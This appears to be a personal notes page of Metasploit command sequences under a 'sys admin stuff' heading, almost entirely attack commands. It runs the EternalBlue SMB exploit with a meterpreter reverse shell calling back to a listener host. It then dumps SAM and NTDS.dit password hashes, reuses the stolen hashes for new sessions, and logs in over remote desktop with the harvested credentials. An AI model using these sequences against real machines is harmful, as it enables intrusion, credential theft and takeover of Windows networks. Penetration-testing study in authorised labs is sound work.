---
layout: default
title: msfconsole examples
parent: sys admin stuff
nav_order: 2
---

1. TOC
{:toc}

```bash
# 1. example  
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set RHOST 192.168.210.3
set LHOST 192.168.210.4
exploit

run post/windows/gather/hashdump

# 2. example

msfconsole -q
use auxiliary/admin/smb/psexec_ntdsgrab
set RHOST 192.168.210.3
set LHOST 192.168.210.4
set SMBUser administrator
set SMBPass hash or password
set SMBDomain domain
set SMBSHARE C$
run


#the first examples grabs creds from the SAM file.
#the second example grabs creds from the NTDS.dit file.


msfconsole -q
use exploit/windows/smb/ms17_010_psexec
set RHOST 192.168.210.3
set payload windows/x64/meterpreter/reverse_tcp
set SMBUser administrator
set SMBPass 12345678
set LHOST 192.168.210.4
exploit

run post/windows/gather/hashdump

#After obtaining the users and passwords, you can get a new session of meterpreter by changing user and password.

background

set RHOST 192.168.210.3
set payload windows/x64/meterpreter/reverse_tcp
set SMBUser windows7
set SMBPass hash
set LHOST 192.168.210.4
exploit

#With the following command, we achieve a remote connection through a remote desktop.

rdesktop -u windows7 -p password 192.168.210.3
```


---

## Resources and More
{: .no_toc }
